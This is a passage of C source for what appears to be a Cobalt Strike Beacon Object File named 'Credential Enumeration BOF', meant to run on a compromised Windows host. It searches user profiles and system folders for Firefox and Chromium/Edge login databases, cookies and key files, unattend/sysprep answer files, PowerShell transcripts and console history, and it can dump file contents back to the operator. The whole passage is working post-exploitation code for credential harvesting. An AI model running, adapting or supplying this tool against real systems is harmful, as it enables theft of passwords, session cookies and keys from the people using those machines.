    WCHAR* searchPath = (WCHAR*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, MAX_PATH_LENGTH * sizeof(WCHAR));
    WCHAR* fullPath = (WCHAR*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, MAX_PATH_LENGTH * sizeof(WCHAR));
    WIN32_FIND_DATAW findData;
    HANDLE hFind;

    if (!searchPath || !fullPath) goto cleanup;

    if (!SafeCopyW(searchPath, dir, MAX_PATH_LENGTH)) goto cleanup;
    if (!SafeConcatW(searchPath, L"\\PowerShell_transcript*.txt", MAX_PATH_LENGTH)) goto cleanup;

    hFind = FindFirstFileW(searchPath, &findData);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
            if (stats->transcriptReported >= MAX_TRANSCRIPT_FILES) break;
            if (!SafeCopyW(fullPath, dir, MAX_PATH_LENGTH)) continue;
            if (!SafeConcatW(fullPath, L"\\", MAX_PATH_LENGTH)) continue;
            if (!SafeConcatW(fullPath, findData.cFileName, MAX_PATH_LENGTH)) continue;
            if (ReportMatchedPath(fullPath, "PS_TRANSCRIPT", stats)) {
                stats->transcriptReported++;
            }
        } while (FindNextFileW(hFind, &findData));
        FindClose(hFind);
    }

    // The policy OutputDirectory holds one subfolder per day (YYYYMMDD).
    if (recurseOneLevel) {
        if (!SafeCopyW(searchPath, dir, MAX_PATH_LENGTH)) goto cleanup;
        if (!SafeConcatW(searchPath, L"\\*", MAX_PATH_LENGTH)) goto cleanup;

        hFind = FindFirstFileW(searchPath, &findData);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
                if (findData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) continue;
                if (lstrcmpW(findData.cFileName, L".") == 0 ||
                    lstrcmpW(findData.cFileName, L"..") == 0) continue;
                if (stats->transcriptReported >= MAX_TRANSCRIPT_FILES) break;
                if (!SafeCopyW(fullPath, dir, MAX_PATH_LENGTH)) continue;
                if (!SafeConcatW(fullPath, L"\\", MAX_PATH_LENGTH)) continue;
                if (!SafeConcatW(fullPath, findData.cFileName, MAX_PATH_LENGTH)) continue;
                ReportTranscriptsInDirectory(fullPath, FALSE, stats);
            } while (FindNextFileW(hFind, &findData));
            FindClose(hFind);
        }
    }

cleanup:
    if (searchPath) HeapFree(hHeap, 0, searchPath);
    if (fullPath) HeapFree(hHeap, 0, fullPath);
}

void CheckTranscriptPolicy(EnumStats* stats) {
    HANDLE hHeap = GetProcessHeap();
    HKEY hKey;
    DWORD enabled = 0;
    DWORD type = 0;
    DWORD size;
    LONG result;
    WCHAR* rawDir = NULL;
    WCHAR* dir = NULL;
    char* dirUtf8 = NULL;
    DWORD before = stats->transcriptReported;

    result = RegOpenKeyExW(HKEY_LOCAL_MACHINE,
                           L"SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription",
                           0, KEY_READ, &hKey);
    if (result != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] PowerShell transcription policy: not configured\n");
        return;
    }

    size = sizeof(enabled);
    if (RegQueryValueExW(hKey, L"EnableTranscripting", NULL, &type, (BYTE*)&enabled, &size) != ERROR_SUCCESS ||
        type != REG_DWORD) {
        enabled = 0;
    }

    rawDir = (WCHAR*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, MAX_PATH_LENGTH * sizeof(WCHAR));
    dir = (WCHAR*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, MAX_PATH_LENGTH * sizeof(WCHAR));
    dirUtf8 = (char*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, MAX_PATH_LENGTH * 3);
    if (!rawDir || !dir || !dirUtf8) {
        RegCloseKey(hKey);
        goto cleanup;
    }

    size = (MAX_PATH_LENGTH - 1) * sizeof(WCHAR);
    result = RegQueryValueExW(hKey, L"OutputDirectory", NULL, &type, (BYTE*)rawDir, &size);
    RegCloseKey(hKey);

    if (result != ERROR_SUCCESS || (type != REG_SZ && type != REG_EXPAND_SZ) ||
        size < sizeof(WCHAR) || rawDir[0] == L'\0') {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] PowerShell transcription policy: EnableTranscripting=%lu, no OutputDirectory (transcripts land in each user's Documents)\n",
            enabled);
        goto cleanup;
    }
    rawDir[MAX_PATH_LENGTH - 1] = L'\0';

    if (ExpandEnvironmentStringsW(rawDir, dir, MAX_PATH_LENGTH) == 0 ||
        ExpandEnvironmentStringsW(rawDir, dir, MAX_PATH_LENGTH) > MAX_PATH_LENGTH) {
        if (!SafeCopyW(dir, rawDir, MAX_PATH_LENGTH)) goto cleanup;
    }

    {
        int len = lstrlenW(dir);
        while (len > 3 && (dir[len - 1] == L'\\' || dir[len - 1] == L'/')) {
            dir[--len] = L'\0';
        }
    }

    WideCharToUtf8(dir, dirUtf8, MAX_PATH_LENGTH * 3);
    BeaconPrintf(CALLBACK_OUTPUT,
        "[+] PowerShell transcription policy: EnableTranscripting=%lu, OutputDirectory=%s\n",
        enabled, dirUtf8);

    ReportTranscriptsInDirectory(dir, TRUE, stats);

    if (stats->transcriptReported == before) {
        BeaconPrintf(CALLBACK_OUTPUT, "    [*] No transcripts found in OutputDirectory (or no access)\n");
    } else if (stats->transcriptReported >= MAX_TRANSCRIPT_FILES) {
        BeaconPrintf(CALLBACK_OUTPUT, "    [!] Transcript listing capped at %d files\n", MAX_TRANSCRIPT_FILES);
    }

cleanup:
    if (rawDir) HeapFree(hHeap, 0, rawDir);
    if (dir) HeapFree(hHeap, 0, dir);
    if (dirUtf8) HeapFree(hHeap, 0, dirUtf8);
}

void CheckSystemSetupArtifacts(EnumStats* stats) {
    WCHAR winDir[MAX_PATH_LENGTH];
    WCHAR path[MAX_PATH_LENGTH];
    WCHAR driveRoot[4];
    UINT n;
    int i;

    const WCHAR* unattendUnderWindows[] = {
        L"\\Panther\\Unattend.xml",
        L"\\Panther\\Unattended.xml",
        L"\\Panther\\Unattend\\Unattend.xml",
        L"\\Panther\\Unattend\\Unattended.xml",
        L"\\System32\\Sysprep\\Unattend.xml",
        L"\\System32\\Sysprep\\Panther\\Unattend.xml",
        L"\\Unattend.xml",
        L"\\System32\\Unattend.xml",
    };
    const WCHAR* sysprepUnderWindows[] = {
        L"\\System32\\Sysprep\\sysprep.xml",
        L"\\System32\\Sysprep\\sysprep.inf",
    };

    n = GetWindowsDirectoryW(winDir, MAX_PATH_LENGTH);
    if (n == 0 || n >= MAX_PATH_LENGTH) {
        lstrcpyW(winDir, L"C:\\Windows");
    }

    for (i = 0; i < (int)(sizeof(unattendUnderWindows) / sizeof(unattendUnderWindows[0])); i++) {
        if (!SafeCopyW(path, winDir, MAX_PATH_LENGTH)) continue;
        if (!SafeConcatW(path, unattendUnderWindows[i], MAX_PATH_LENGTH)) continue;
        ReportMatchedPath(path, "UNATTEND_XML", stats);
    }

    for (i = 0; i < (int)(sizeof(sysprepUnderWindows) / sizeof(sysprepUnderWindows[0])); i++) {
        if (!SafeCopyW(path, winDir, MAX_PATH_LENGTH)) continue;
        if (!SafeConcatW(path, sysprepUnderWindows[i], MAX_PATH_LENGTH)) continue;
        ReportMatchedPath(path, "SYSPREP_XML", stats);
    }

    // Drive root of the Windows install, e.g. C:\unattend.xml
    if (lstrlenW(winDir) >= 2 && winDir[1] == L':') {
        driveRoot[0] = winDir[0];
        driveRoot[1] = L':';
        driveRoot[2] = L'\\';
        driveRoot[3] = L'\0';

        if (SafeCopyW(path, driveRoot, MAX_PATH_LENGTH) &&
            SafeConcatW(path, L"unattend.xml", MAX_PATH_LENGTH)) {
            ReportMatchedPath(path, "UNATTEND_XML", stats);
        }
        if (SafeCopyW(path, driveRoot, MAX_PATH_LENGTH) &&
            SafeConcatW(path, L"sysprep.inf", MAX_PATH_LENGTH)) {
            ReportMatchedPath(path, "SYSPREP_XML", stats);
        }
    }
}

void CheckFirefoxArtifactsForUser(LPCWSTR userBasePath, EnumStats* stats) {
    HANDLE hHeap = GetProcessHeap();
    WCHAR* profilesRoot = (WCHAR*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, MAX_PATH_LENGTH * sizeof(WCHAR));
    WCHAR* searchPath = (WCHAR*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, MAX_PATH_LENGTH * sizeof(WCHAR));
    WCHAR* profilePath = (WCHAR*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, MAX_PATH_LENGTH * sizeof(WCHAR));
    WCHAR* artifactPath = (WCHAR*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, MAX_PATH_LENGTH * sizeof(WCHAR));
    WIN32_FIND_DATAW findData;
    HANDLE hFind;

    if (!profilesRoot || !searchPath || !profilePath || !artifactPath) goto cleanup;

    if (!SafeCopyW(profilesRoot, userBasePath, MAX_PATH_LENGTH)) goto cleanup;
    if (!SafeConcatW(profilesRoot, L"\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles", MAX_PATH_LENGTH)) goto cleanup;

    if (!SafeCopyW(searchPath, profilesRoot, MAX_PATH_LENGTH)) goto cleanup;
    if (!SafeConcatW(searchPath, L"\\*", MAX_PATH_LENGTH)) goto cleanup;

    hFind = FindFirstFileW(searchPath, &findData);
    if (hFind == INVALID_HANDLE_VALUE) goto cleanup;

    do {
        DWORD attrs = findData.dwFileAttributes;

        if (!(attrs & FILE_ATTRIBUTE_DIRECTORY)) continue;
        if (ShouldSkipDirectory(profilesRoot, findData.cFileName, attrs, 1)) continue;

        if (!SafeCopyW(profilePath, profilesRoot, MAX_PATH_LENGTH)) continue;
        if (!SafeConcatW(profilePath, L"\\", MAX_PATH_LENGTH)) continue;
        if (!SafeConcatW(profilePath, findData.cFileName, MAX_PATH_LENGTH)) continue;

        if (!SafeCopyW(artifactPath, profilePath, MAX_PATH_LENGTH)) continue;
        if (SafeConcatW(artifactPath, L"\\logins.json", MAX_PATH_LENGTH)) {
            ReportMatchedPath(artifactPath, "FIREFOX_LOGINS", stats);
        }

        if (!SafeCopyW(artifactPath, profilePath, MAX_PATH_LENGTH)) continue;
        if (SafeConcatW(artifactPath, L"\\key4.db", MAX_PATH_LENGTH)) {
            ReportMatchedPath(artifactPath, "FIREFOX_KEY_DB", stats);
        }
    } while (FindNextFileW(hFind, &findData));

    FindClose(hFind);

cleanup:
    if (profilesRoot) HeapFree(hHeap, 0, profilesRoot);
    if (searchPath) HeapFree(hHeap, 0, searchPath);
    if (profilePath) HeapFree(hHeap, 0, profilePath);
    if (artifactPath) HeapFree(hHeap, 0, artifactPath);
}

void CheckChromiumArtifactsForUser(LPCWSTR userBasePath, LPCWSTR browserRootSuffix,
                                   LPCSTR localStateType, LPCSTR cookiesType,
                                   LPCSTR loginType, EnumStats* stats) {
    HANDLE hHeap = GetProcessHeap();
    WCHAR* userDataRoot = (WCHAR*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, MAX_PATH_LENGTH * sizeof(WCHAR));
    WCHAR* searchPath = (WCHAR*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, MAX_PATH_LENGTH * sizeof(WCHAR));
    WCHAR* profilePath = (WCHAR*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, MAX_PATH_LENGTH * sizeof(WCHAR));
    WCHAR* artifactPath = (WCHAR*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, MAX_PATH_LENGTH * sizeof(WCHAR));
    WIN32_FIND_DATAW findData;
    HANDLE hFind;

    if (!userDataRoot || !searchPath || !profilePath || !artifactPath) goto cleanup;

    if (!SafeCopyW(userDataRoot, userBasePath, MAX_PATH_LENGTH)) goto cleanup;
    if (!SafeConcatW(userDataRoot, browserRootSuffix, MAX_PATH_LENGTH)) goto cleanup;

    if (!SafeCopyW(artifactPath, userDataRoot, MAX_PATH_LENGTH)) goto cleanup;
    if (SafeConcatW(artifactPath, L"\\Local State", MAX_PATH_LENGTH)) {
        ReportMatchedPath(artifactPath, localStateType, stats);
    }

    if (!SafeCopyW(searchPath, userDataRoot, MAX_PATH_LENGTH)) goto cleanup;
    if (!SafeConcatW(searchPath, L"\\*", MAX_PATH_LENGTH)) goto cleanup;

    hFind = FindFirstFileW(searchPath, &findData);
    if (hFind == INVALID_HANDLE_VALUE) goto cleanup;

    do {
        DWORD attrs = findData.dwFileAttributes;

        if (!(attrs & FILE_ATTRIBUTE_DIRECTORY)) continue;
        if (ShouldSkipDirectory(userDataRoot, findData.cFileName, attrs, 1)) continue;
        if (!IsChromiumProfileDirectory(findData.cFileName)) continue;

        if (!SafeCopyW(profilePath, userDataRoot, MAX_PATH_LENGTH)) continue;
        if (!SafeConcatW(profilePath, L"\\", MAX_PATH_LENGTH)) continue;
        if (!SafeConcatW(profilePath, findData.cFileName, MAX_PATH_LENGTH)) continue;

        if (!SafeCopyW(artifactPath, profilePath, MAX_PATH_LENGTH)) continue;
        if (SafeConcatW(artifactPath, L"\\Network\\Cookies", MAX_PATH_LENGTH)) {
            ReportMatchedPath(artifactPath, cookiesType, stats);
        }

        if (!SafeCopyW(artifactPath, profilePath, MAX_PATH_LENGTH)) continue;
        if (SafeConcatW(artifactPath, L"\\Login Data", MAX_PATH_LENGTH)) {
            ReportMatchedPath(artifactPath, loginType, stats);
        }
    } while (FindNextFileW(hFind, &findData));

    FindClose(hFind);

cleanup:
    if (userDataRoot) HeapFree(hHeap, 0, userDataRoot);
    if (searchPath) HeapFree(hHeap, 0, searchPath);
    if (profilePath) HeapFree(hHeap, 0, profilePath);
    if (artifactPath) HeapFree(hHeap, 0, artifactPath);
}

BOOL RunTargetedUserEnumeration(LPCWSTR searchPath, DWORD groupFlags, EnumStats* stats) {
    if (!(groupFlags & (GROUP_BROWSER | GROUP_HISTORY))) {
        return FALSE;
    }

    if (IsUsersRootPath(searchPath)) {
        HANDLE hHeap = GetProcessHeap();
        WCHAR* usersSearchPath = (WCHAR*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, MAX_PATH_LENGTH * sizeof(WCHAR));
        WCHAR* currentUserPath = (WCHAR*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, MAX_PATH_LENGTH * sizeof(WCHAR));
        WIN32_FIND_DATAW findData;
        HANDLE hFind;

        if (!usersSearchPath || !currentUserPath) goto root_cleanup;
        if (!SafeCopyW(usersSearchPath, searchPath, MAX_PATH_LENGTH)) goto root_cleanup;
        if (!SafeConcatW(usersSearchPath, L"\\*", MAX_PATH_LENGTH)) goto root_cleanup;

        hFind = FindFirstFileW(usersSearchPath, &findData);
        if (hFind == INVALID_HANDLE_VALUE) goto root_cleanup;

        do {
            DWORD attrs = findData.dwFileAttributes;

            if (!(attrs & FILE_ATTRIBUTE_DIRECTORY)) continue;
            if (ShouldSkipDirectory(searchPath, findData.cFileName, attrs, 0)) continue;

            if (!SafeCopyW(currentUserPath, searchPath, MAX_PATH_LENGTH)) continue;
            if (!SafeConcatW(currentUserPath, L"\\", MAX_PATH_LENGTH)) continue;
            if (!SafeConcatW(currentUserPath, findData.cFileName, MAX_PATH_LENGTH)) continue;

            if (groupFlags & GROUP_BROWSER) {
                CheckFirefoxArtifactsForUser(currentUserPath, stats);
                CheckChromiumArtifactsForUser(
                    currentUserPath,
                    L"\\AppData\\Local\\Google\\Chrome\\User Data",
                    "CHROME_LOCAL_STATE",
                    "CHROME_COOKIES",
                    "CHROME_LOGIN_DATA",
                    stats
                );
                CheckChromiumArtifactsForUser(
                    currentUserPath,
                    L"\\AppData\\Local\\Microsoft\\Edge\\User Data",
                    "EDGE_LOCAL_STATE",
                    "EDGE_COOKIES",
                    "EDGE_LOGIN_DATA",
                    stats
                );
            }

            if (groupFlags & GROUP_HISTORY) {
                CheckConsoleHistoryForUser(currentUserPath, stats);
            }
        } while (FindNextFileW(hFind, &findData));

        FindClose(hFind);
        HeapFree(hHeap, 0, usersSearchPath);
        HeapFree(hHeap, 0, currentUserPath);
        return TRUE;

root_cleanup:
        if (usersSearchPath) HeapFree(hHeap, 0, usersSearchPath);
        if (currentUserPath) HeapFree(hHeap, 0, currentUserPath);
        return FALSE;
    }

    {
        HANDLE hHeap = GetProcessHeap();
        WCHAR* userBasePath = (WCHAR*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, MAX_PATH_LENGTH * sizeof(WCHAR));

        if (!userBasePath) return FALSE;
        if (!TryBuildUserBasePath(searchPath, userBasePath, MAX_PATH_LENGTH)) {
            HeapFree(hHeap, 0, userBasePath);
            return FALSE;
        }

        if (groupFlags & GROUP_BROWSER) {
            CheckFirefoxArtifactsForUser(userBasePath, stats);
            CheckChromiumArtifactsForUser(
                userBasePath,
                L"\\AppData\\Local\\Google\\Chrome\\User Data",
                "CHROME_LOCAL_STATE",
                "CHROME_COOKIES",
                "CHROME_LOGIN_DATA",
                stats
            );
            CheckChromiumArtifactsForUser(
                userBasePath,
                L"\\AppData\\Local\\Microsoft\\Edge\\User Data",
                "EDGE_LOCAL_STATE",
                "EDGE_COOKIES",
                "EDGE_LOGIN_DATA",
                stats
            );
        }

        if (groupFlags & GROUP_HISTORY) {
            CheckConsoleHistoryForUser(userBasePath, stats);
        }

        HeapFree(hHeap, 0, userBasePath);
    }

    return TRUE;
}

/* ------------------------------------------------------------------ */
/* Utility: Format file size                                          */
/* ------------------------------------------------------------------ */

void FormatFileSize(ULONGLONG size, char* buffer, int bufferSize) {
    if (size >= 1073741824) {
        double sizeGB = (double)size / 1073741824.0;
        _snprintf(buffer, bufferSize, "%.2f GB", sizeGB);
    } else if (size >= 1048576) {
        double sizeMB = (double)size / 1048576.0;
        _snprintf(buffer, bufferSize, "%.2f MB", sizeMB);
    } else if (size >= 1024) {
        double sizeKB = (double)size / 1024.0;
        _snprintf(buffer, bufferSize, "%.2f KB", sizeKB);
    } else {
        _snprintf(buffer, bufferSize, "%llu bytes", size);
    }
}

/* ------------------------------------------------------------------ */
/* Utility: Format FILETIME to readable string                        */
/* ------------------------------------------------------------------ */

void FormatFileTime(const FILETIME* ft, char* buffer, int bufferSize) {
    SYSTEMTIME stUTC, stLocal;

    if (!FileTimeToSystemTime(ft, &stUTC)) {
        _snprintf(buffer, bufferSize, "Unknown");
        return;
    }

    if (!SystemTimeToTzSpecificLocalTime(NULL, &stUTC, &stLocal)) {
        _snprintf(buffer, bufferSize, "%04d-%02d-%02d %02d:%02d:%02d UTC",
                 stUTC.wYear, stUTC.wMonth, stUTC.wDay,
                 stUTC.wHour, stUTC.wMinute, stUTC.wSecond);
    } else {
        _snprintf(buffer, bufferSize, "%04d-%02d-%02d %02d:%02d:%02d",
                 stLocal.wYear, stLocal.wMonth, stLocal.wDay,
                 stLocal.wHour, stLocal.wMinute, stLocal.wSecond);
    }
}

/* ------------------------------------------------------------------ */
/* Utility: Wide string to UTF-8 (with surrogate pair support)        */
/* ------------------------------------------------------------------ */

int WideCharToUtf8(LPCWSTR wide, char* buffer, int bufferSize) {
    int i = 0;
    int j = 0;

    while (wide[i] && j < bufferSize - 1) {
        if (wide[i] < 0x80) {
            buffer[j++] = (char)wide[i];
        } else if (wide[i] < 0x800) {
            if (j + 1 >= bufferSize - 1) break;
            buffer[j++] = 0xC0 | (wide[i] >> 6);
            buffer[j++] = 0x80 | (wide[i] & 0x3F);
        } else if (wide[i] >= 0xD800 && wide[i] <= 0xDBFF) {
            if (wide[i + 1] >= 0xDC00 && wide[i + 1] <= 0xDFFF) {
                if (j + 3 >= bufferSize - 1) break;
                DWORD codepoint = 0x10000 +
                    ((wide[i] & 0x3FF) << 10) + (wide[i + 1] & 0x3FF);
                buffer[j++] = 0xF0 | (codepoint >> 18);
                buffer[j++] = 0x80 | ((codepoint >> 12) & 0x3F);
                buffer[j++] = 0x80 | ((codepoint >> 6) & 0x3F);
                buffer[j++] = 0x80 | (codepoint & 0x3F);
                i++;
            } else {
                if (j + 2 >= bufferSize - 1) break;
                buffer[j++] = 0xEF;
                buffer[j++] = 0xBF;
                buffer[j++] = 0xBD;
            }
        } else if (wide[i] >= 0xDC00 && wide[i] <= 0xDFFF) {
            if (j + 2 >= bufferSize - 1) break;
            buffer[j++] = 0xEF;
            buffer[j++] = 0xBF;
            buffer[j++] = 0xBD;
        } else {
            if (j + 2 >= bufferSize - 1) break;
            buffer[j++] = 0xE0 | (wide[i] >> 12);
            buffer[j++] = 0x80 | ((wide[i] >> 6) & 0x3F);
            buffer[j++] = 0x80 | (wide[i] & 0x3F);
        }
        i++;
    }
    buffer[j] = '\0';
    return j;
}

/* ------------------------------------------------------------------ */
/* Recursive directory search                                         */
/* ------------------------------------------------------------------ */

void SearchDirectory(LPWSTR basePath, DWORD groupFlags, DWORD subFlags,
                     int currentDepth, EnumStats* stats) {
    WIN32_FIND_DATAW findData;
    HANDLE hFind;
    LPWSTR searchPath;
    LPWSTR fullPath;
    int baseLen;

    if (currentDepth > MAX_RECURSION_DEPTH) return;

    baseLen = lstrlenW(basePath);
    if (baseLen >= MAX_PATH_LENGTH - 10) return;

    // Check enumeration limit
    if (stats->totalEnumerated >= MAX_FILES) return;

    searchPath = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
                                   (baseLen + 10) * sizeof(WCHAR));
    if (!searchPath) return;

    // Build search path: "basePath\*"
    lstrcpyW(searchPath, basePath);
    if (baseLen > 0 && basePath[baseLen - 1] != L'\\') {
        lstrcatW(searchPath, L"\\");
    }
    lstrcatW(searchPath, L"*");

    hFind = FindFirstFileW(searchPath, &findData);
    if (hFind == INVALID_HANDLE_VALUE) {
        HeapFree(GetProcessHeap(), 0, searchPath);
        return;
    }

    do {
        if (stats->totalEnumerated >= MAX_FILES) {
            BeaconPrintf(CALLBACK_OUTPUT,
                "\n[!] Reached file enumeration limit (%d files)\n", MAX_FILES);
            break;
        }
        stats->totalEnumerated++;

        // Skip . and ..
        if (lstrcmpW(findData.cFileName, L".") == 0 ||
            lstrcmpW(findData.cFileName, L"..") == 0) {
            continue;
        }

        // Build full path
        int fileNameLen = lstrlenW(findData.cFileName);
        int fullPathLen = baseLen + fileNameLen + 2;
        if (fullPathLen >= MAX_PATH_LENGTH) continue;

        fullPath = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
                                     fullPathLen * sizeof(WCHAR));
        if (!fullPath) continue;

        lstrcpyW(fullPath, basePath);
        if (baseLen > 0 && basePath[baseLen - 1] != L'\\') {
            lstrcatW(fullPath, L"\\");
        }
        lstrcatW(fullPath, findData.cFileName);

        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (!ShouldSkipDirectory(basePath, findData.cFileName,
                                     findData.dwFileAttributes, currentDepth)) {
                SearchDirectory(fullPath, groupFlags, subFlags,
                               currentDepth + 1, stats);
            }
        } else {
            char fileType[64];
            if (MatchesPattern(findData.cFileName, fullPath, groupFlags,
                              subFlags, fileType, sizeof(fileType))) {
                ULONGLONG fileSize =
                    ((ULONGLONG)findData.nFileSizeHigh << 32) |
                    findData.nFileSizeLow;

                char timestamp[32];
                FormatFileTime(&findData.ftLastWriteTime, timestamp,
                              sizeof(timestamp));

                char sizeStr[32];
                FormatFileSize(fileSize, sizeStr, sizeof(sizeStr));

                char* pathUtf8 = (char*)HeapAlloc(GetProcessHeap(),
                                                   HEAP_ZERO_MEMORY, 2048);
                if (pathUtf8) {
                    WideCharToUtf8(fullPath, pathUtf8, 2048);
                    BeaconPrintf(CALLBACK_OUTPUT,
                        "[%s] %s\n    Size: %s | Modified: %s\n",
                        fileType, pathUtf8, sizeStr, timestamp);
                    HeapFree(GetProcessHeap(), 0, pathUtf8);
                }

                UpdateStatsForType(fileType, fileSize, stats);
                if (stats->dumpMaxBytes > 0) {
                    DumpFileContents(fullPath, stats->dumpMaxBytes);
                }
            }
        }

        HeapFree(GetProcessHeap(), 0, fullPath);

    } while (FindNextFileW(hFind, &findData));

    FindClose(hFind);
    HeapFree(GetProcessHeap(), 0, searchPath);
}

/* ------------------------------------------------------------------ */
/* BOF entry point                                                    */
/* ------------------------------------------------------------------ */

#ifdef BOF
void go(char* args, int len) {
    datap parser;
    LPWSTR searchPath;
    int groupFlags;
    int subFlags;
    int dumpMaxBytes;
    DWORD recursiveGroupFlags;
    EnumStats stats;

    memset(&stats, 0, sizeof(EnumStats));

    // Parse arguments: searchPath (wstring), groupFlags (int), subFlags (int),
    // dumpMaxBytes (int, 0 = no content dump)
    BeaconDataParse(&parser, args, len);
    searchPath = (LPWSTR)BeaconDataExtract(&parser, NULL);
    groupFlags = BeaconDataInt(&parser);
    subFlags = BeaconDataInt(&parser);
    dumpMaxBytes = BeaconDataInt(&parser);

    if (dumpMaxBytes < 0) dumpMaxBytes = 0;
    if (dumpMaxBytes > DUMP_MAX_HARD_LIMIT) dumpMaxBytes = DUMP_MAX_HARD_LIMIT;
    stats.dumpMaxBytes = (DWORD)dumpMaxBytes;

    // Validate search path
    if (!searchPath || lstrlenW(searchPath) == 0) {
        searchPath = L"C:\\Users";
    }
    if (lstrlenW(searchPath) >= MAX_PATH_LENGTH) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Search path exceeds maximum length\n");
        return;
    }

    // Default to all groups if none specified
    if (groupFlags == 0) groupFlags = GROUP_DEFAULT;
    if (subFlags == 0) subFlags = 0xFF;
    recursiveGroupFlags = (DWORD)groupFlags;

    // Print header
    char* pathUtf8 = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
                                       MAX_PATH_LENGTH * 2);
    if (!pathUtf8) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Memory allocation failed\n");
        return;
    }
    WideCharToUtf8(searchPath, pathUtf8, MAX_PATH_LENGTH * 2);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Credential Enumeration BOF\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Search Path: %s\n", pathUtf8);
    HeapFree(GetProcessHeap(), 0, pathUtf8);

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Searching for: ");
    BOOL first = TRUE;
    if (groupFlags & GROUP_APPDATA) {
        BeaconPrintf(CALLBACK_OUTPUT, "App Data");
        first = FALSE;
    }
    if (groupFlags & GROUP_BROWSER) {
        if (!first) BeaconPrintf(CALLBACK_OUTPUT, ", ");
        BeaconPrintf(CALLBACK_OUTPUT, "Browser Creds");
        first = FALSE;
    }
    if (groupFlags & GROUP_CREDS) {
        if (!first) BeaconPrintf(CALLBACK_OUTPUT, ", ");
        BeaconPrintf(CALLBACK_OUTPUT, "Credential Files");
        first = FALSE;
    }
    if (groupFlags & GROUP_HISTORY) {
        if (!first) BeaconPrintf(CALLBACK_OUTPUT, ", ");
        BeaconPrintf(CALLBACK_OUTPUT, "Console History");
    }
    BeaconPrintf(CALLBACK_OUTPUT, "\n");
    if (stats.dumpMaxBytes > 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Dump: first %lu bytes of each text match\n",
                     stats.dumpMaxBytes);
    }
    BeaconPrintf(CALLBACK_OUTPUT, "\n");

    // Fixed system locations are probed regardless of the search path.
    if (groupFlags & GROUP_HISTORY) {
        CheckTranscriptPolicy(&stats);
    }
    if ((groupFlags & GROUP_CREDS) && (subFlags & CRED_TYPE_SETUP)) {
        CheckSystemSetupArtifacts(&stats);
    }

    if (RunTargetedUserEnumeration(searchPath, (DWORD)groupFlags, &stats)) {
        recursiveGroupFlags &= ~(GROUP_BROWSER | GROUP_HISTORY);
    }

    if (recursiveGroupFlags != 0) {
        SearchDirectory(searchPath, recursiveGroupFlags, subFlags, 0, &stats);
    }

    // Print summary
    BeaconPrintf(CALLBACK_OUTPUT, "\n[+] Summary:\n");
    BeaconPrintf(CALLBACK_OUTPUT, "[+]   Total Files Found: %d\n", stats.fileCount);

    if (groupFlags & GROUP_APPDATA) {
        if (stats.databaseCount > 0)
            BeaconPrintf(CALLBACK_OUTPUT, "[+]   Database Client Files: %d\n", stats.databaseCount);
        if (stats.chatCount > 0)
            BeaconPrintf(CALLBACK_OUTPUT, "[+]   Chat App Files: %d\n", stats.chatCount);
        if (stats.browserExtCount > 0)
            BeaconPrintf(CALLBACK_OUTPUT, "[+]   Browser Extension Files: %d\n", stats.browserExtCount);
    }
    if (groupFlags & GROUP_BROWSER) {
        if (stats.browserCredCount > 0)
            BeaconPrintf(CALLBACK_OUTPUT, "[+]   Browser Credential Files: %d\n", stats.browserCredCount);
    }
    if (groupFlags & GROUP_CREDS) {
        if (stats.sshCount > 0)
            BeaconPrintf(CALLBACK_OUTPUT, "[+]   SSH Keys: %d\n", stats.sshCount);
        if (stats.cloudCount > 0)
            BeaconPrintf(CALLBACK_OUTPUT, "[+]   Cloud Credentials: %d\n", stats.cloudCount);
        if (stats.gitCount > 0)
            BeaconPrintf(CALLBACK_OUTPUT, "[+]   Git Configs: %d\n", stats.gitCount);
        if (stats.passwordCount > 0)
            BeaconPrintf(CALLBACK_OUTPUT, "[+]   Password Databases: %d\n", stats.passwordCount);
        if (stats.vpnCount > 0)
            BeaconPrintf(CALLBACK_OUTPUT, "[+]   VPN Configs: %d\n", stats.vpnCount);
        if (stats.setupCount > 0)
            BeaconPrintf(CALLBACK_OUTPUT, "[+]   Setup Answer Files: %d\n", stats.setupCount);
    }
    if (groupFlags & GROUP_HISTORY) {
        if (stats.historyCount > 0)
            BeaconPrintf(CALLBACK_OUTPUT, "[+]   Console History Files: %d\n", stats.historyCount);
    }

    char totalSizeStr[32];
    FormatFileSize(stats.totalSize, totalSizeStr, sizeof(totalSizeStr));
    BeaconPrintf(CALLBACK_OUTPUT, "[+]   Total Size: %s\n", totalSizeStr);
    BeaconPrintf(CALLBACK_OUTPUT, "[+]   Entries Enumerated: %d\n", stats.totalEnumerated);
}

#else
// Test harness for local execution
